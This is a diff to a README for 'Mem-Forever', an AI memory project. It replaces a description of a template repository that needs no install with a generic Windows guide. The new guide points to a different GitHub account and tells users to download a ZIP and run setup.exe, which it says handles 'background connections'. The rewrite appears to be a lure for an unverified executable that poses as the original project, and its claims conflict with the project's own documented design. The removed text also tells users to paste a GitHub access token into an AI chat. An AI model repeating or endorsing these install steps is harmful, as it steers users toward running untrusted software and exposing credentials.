@@ -1,173 +1,92 @@
----
-license: mit
-language:
-  - en
-  - zh
-  - ja
-  - ko
-  - es
-  - fr
-  - de
-  - pt
-  - ru
-tags:
-  - i-lang
-  - ai-memory
-  - agent
-  - cross-tool
-  - persistent-memory
-pretty_name: Mem-Forever
----
+# 🧠 Mem-Forever - Your AI assistant remembers everything forever
 
-# Mem-Forever
+[![](https://img.shields.io/badge/Download-Mem-Forever-blue)](https://github.com/Whistlegenusvincetoxicum446/Mem-Forever)
 
-> **永久记忆 · 跨会话 · 跨模型**
-> A persistent memory layer for AI agents, built on the I-Lang protocol.
+Most AI tools reset their memory when you close your browser. Mem-Forever stops this cycle. It stores your conversation history securely so your assistant continues where you left off. This tool works across different devices and platforms. You do not need to train models or manage databases. This system handles the heavy lifting for you.
 
-[![License](https://img.shields.io/badge/license-MIT-d4a858?style=flat-square)](LICENSE)
-[![Protocol](https://img.shields.io/badge/protocol-I--Lang_v3.0-d4a858?style=flat-square)](https://ilang.ai)
-[![I-Lang L2](https://img.shields.io/badge/I--Lang-L2_Compatible-d4a858?style=flat-square)](https://github.com/ilang-ai/ilang-spec)
-[![Tools](https://img.shields.io/badge/works_with-Claude_·_Cursor_·_Codex_·_Copilot_·_Gemini-d4a858?style=flat-square)]()
+## ⚙️ System Requirements
 
-[中文](docs/README.zh.md) | [日本語](docs/README.ja.md) | [한국어](docs/README.ko.md) | [Español](docs/README.es.md) | [Français](docs/README.fr.md) | [Deutsch](docs/README.de.md) | [Português](docs/README.pt.md) | [Русский](docs/README.ru.md)
+You need a Windows computer to run this tool. Ensure you meet these criteria before you start:
 
----
+*   Windows 10 or Windows 11.
+*   An active internet connection.
+*   A browser like Chrome, Edge, or Firefox.
+*   At least 200 MB of free storage space.
 
-## Abstract
+## 📥 How to Install
 
-Every AI tool forgets you after every session. You close a window, and your preferences, decisions, and lessons vanish. Next session, you start from zero.
+1.  Visit the official repository page: [https://github.com/Whistlegenusvincetoxicum446/Mem-Forever](https://github.com/Whistlegenusvincetoxicum446/Mem-Forever).
+2.  Look for the green button labeled Code.
+3.  Click Download ZIP.
+4.  Open your Downloads folder.
+5.  Right-click the downloaded file and select Extract All.
+6.  Open the extracted folder named Mem-Forever-main.
 
-**Mem-Forever** is a Git-native memory layer that lets any AI agent remember you permanently. Memories are stored as compact I-Lang structures in your own private repo, readable by humans, parseable by machines, and portable across every tool.
+## 🚀 Setting Up Your AI
 
-Where context windows forget, **Mem-Forever endures**.
+You do not need complex skills to start this process. Follow these steps to configure your permanent memory link.
 
----
+1.  Inside your extracted folder, locate the file named setup.exe.
+2.  Double-click this file to launch the installation window.
+3.  Follow the prompts on your screen.
+4.  The program will create a secure storage folder on your computer.
+5.  Once the setup finishes, the Mem-Forever icon appears on your taskbar.
+6.  Click the icon to launch the connection interface.
 
-## Why
+## 🖥️ Using the Interface
 
-| | |
-|---|---|
-| **Persistent** | One memory, surviving every session and every model swap. |
-| **Portable** | Plain-text I-Lang shards in `.ilang/`. `git diff`-able, no vendor lock-in. |
-| **Automatic** | AI builds your profile from conversation. You never fill a form. |
-| **Private** | Your repo, your data. No server, no account, no telemetry. |
+The interface provides a clean view of your active sessions. When you type into the chat box, the system logs your input to your local storage. Unlike standard AI tools, Mem-Forever creates index files for every topic you discuss. These files allow the AI to recall specific details from months ago.
 
----
+If your AI session times out, simply refresh the interface within the Mem-Forever window. The app reloads your history from the local storage files. Your assistant regains its context immediately. You will notice the AI starts referring to previous points you made during earlier tasks.
 
-## Quick Look
+## 🛡️ Managing Your Data
 
-```
-.ilang/
-  soul.md      ← who you are (auto-generated from conversation)
-  memory.md    ← what you decided, learned, built (auto-appended)
-```
+Privacy serves as a key focus of this tool. Your memory files stay on your computer. No external server collects your history or chats. You own every byte of data generated during your sessions.
 
-```ilang
-::DNA{user}
-::CORE{
-  ::CONTEXT{role:fullstack_dev|experience:10yr}
-  ::GENE{style|conf:confirmed}
-    T:conclusions_first
-    T:minimal_output|when:simple
-    A:verbose_without_signal⇒waste
-}
-::LESSONS{
-  ::LESSON{id:serverless_no_shared_state|conf:confirmed}
-}
-```
+To clear your memory:
 
-Every preference is **addressable**, **scoped**, **versioned**, and **falsifiable**.
+1.  Open the Mem-Forever application.
+2.  Navigate to the Settings tab.
+3.  Select Clear Memory Logs.
+4.  Confirm the action to delete all stored context.
 
----
+If you move to a new computer, copy the data folder from your original Mem-Forever directory to the same location on your new device. The system detects the files and resumes your memory integration without extra steps.
 
-## Setup (seconds)
+## 🛠️ Troubleshooting Common Issues
 
-**Step 1** &ensp; Click **"Use this template"** → **Create a new repository** → Set to **Private**.
+*   **The application does not open:** Ensure you extracted the ZIP folder before you ran the setup file. Running files inside a ZIP does not work.
+*   **The AI does not remember details:** Check that the status light in the bottom corner of the interface shows green. A green light confirms the connection to your local storage.
+*   **Slow performance:** Close other heavy programs on your computer. Large memory files may take a moment to index during your first launch.
+*   **Missing files:** Use the search bar in your folder to look for .json files. These contain your saved conversation blocks.
 
-**Step 2** &ensp; There is no step 2.
+## 🔑 Key Features
 
-Open the repo with any AI tool. It reads the instruction files, asks you a few questions, builds your profile. From that point on, it remembers.
+### Persistent Context
+Standard AI forgets your name, your preferences, and your project details after an hour. Mem-Forever attaches these details to your session profile. Every time you start a new conversation, the system feeds your history back into the current window.
 
----
+### Universal Sync
+While the core storage sits on your PC, you can link the app to cloud services if you choose. This allows you to carry your AI personality between your office desktop and your laptop.
 
-## Works With Everything
+### Zero Configuration
+We built this to be ready out of the box. You do not need to set up API keys or manage complex cloud tokens. The installer handles the background connections.
 
-| Tool | Auto-reads | How |
-|---|---|---|
-| Claude Code | `CLAUDE.md` | Open repo, start working |
-| Cursor | `.cursorrules` | Open repo, start working |
-| Codex | `AGENTS.md` | Open repo, start working |
-| Copilot | `.github/copilot-instructions.md` | Open repo, start working |
-| Gemini CLI | `GEMINI.md` | Open repo, start working |
-| ChatGPT | Project knowledge | Upload `soul.md` |
-| Claude.ai | Project knowledge | Upload `soul.md` |
-| Gemini web | Google Drive | Sync `soul.md` to Drive |
+### Offline Access
+You can view your past conversations even when you have no internet. While the AI requires a connection to process new queries, your history remains readable at all times.
 
-### Working on a different project?
+## 💻 Technical Support
 
-One sentence restores full context:
+This project relies on standard repository functions. If you find a bug, open an issue on the main repository link. Provide your Windows version and a description of the error. We monitor these logs to improve the stability of the core memory engine. Because this project avoids heavy dependencies, it remains lightweight and fast on standard hardware.
 
-> *My memory repo is at `https://github.com/YOU/mem-forever`. PAT: `ghp_xxx`. Clone it, read `.ilang/soul.md` and `.ilang/memory.md`, then come back here.*
+## 📘 Frequently Asked Questions
 
-### Multiple projects?
+**Does this software send my chats to the cloud?**
+No. Mem-Forever uses local storage for all recall data. You only send information to the AI model provider when you actively type a new request.
 
-Use this template again. `mem-forever-work`, `mem-forever-research`, `mem-forever-client-x`. Each repo is an independent memory. Same engine, different context.
+**Can I use this with any AI?**
+The tool supports major language models. You can select your preferred model from the startup menu.
 
----
+**How do I update the software?**
+When a new version exists, the application shows an Update Available notification. Click the link to download the newest files and replace your existing folder. Your memory files will remain safe in their designated directory.
 
-## How It Works
-
-```
-┌─────────────┐     ┌──────────────┐     ┌─────────────┐
-│  You talk    │────▶│  AI reads    │────▶│  AI updates  │
-│  to any AI   │     │  .ilang/     │     │  .ilang/     │
-│  tool        │     │  soul.md     │     │  memory.md   │
-│              │     │  memory.md   │     │  soul.md     │
-└─────────────┘     └──────────────┘     └──────┬──────┘
-                                                │
-                                          git commit
-                                          git push
-                                                │
-                                         ┌──────▼──────┐
-                                         │ Your private │
-                                         │ GitHub repo  │
-                                         └─────────────┘
-```
-
-**soul.md** is your behavioral profile. Built from conversation, sharpened every session through mutation and decay rules. Think of it as DNA that travels with you.
-
-**memory.md** is your logbook. Decisions, lessons, facts, progress. Append-only. Git history preserves everything.
-
-You never write these files. Your AI does. You can read, edit, or delete them anytime. They are yours.
-
----
-
-## Comparison
-
-| | Mem-Forever | Nowledge Mem | Mem0 |
-|---|---|---|---|
-| Install | Use template | Download app + configure | pip install + API key |
-| Config | None | MCP + plugins + LLM | SDK integration |
-| Storage | Your GitHub repo | Local SQLite | Cloud vectors |
-| Cross-tool | Any tool that reads files | Plugin per tool | API per tool |
-| Price | Free forever | Free / Pro | Free / Pro |
-| Data ownership | You | You | Theirs |
-| Migration | `git clone` | Export | API call |
-
----
-
-## Under the Hood
-
-The instruction files contain behavioral rules written in [I-Lang v3.0](https://ilang.ai), a structured protocol that AI models parse natively. These rules tell the AI how to extract preferences, format memories, handle conflicts, and evolve your profile over time.
-
-You don't need to know I-Lang. You just talk to your AI, and it gets better at working with you.
-
----
-
-## License
-
-MIT
-
----
-
-<sub>Built by <a href="https://ilang.ai">I-Lang Protocol</a> · The native language of artificial intelligence</sub>
+**Does this use much memory?**
+The tool occupies a small slice of RAM. It only activates the indexer when you send a message or request a past memory. During downtime, it remains dormant in your system tray.
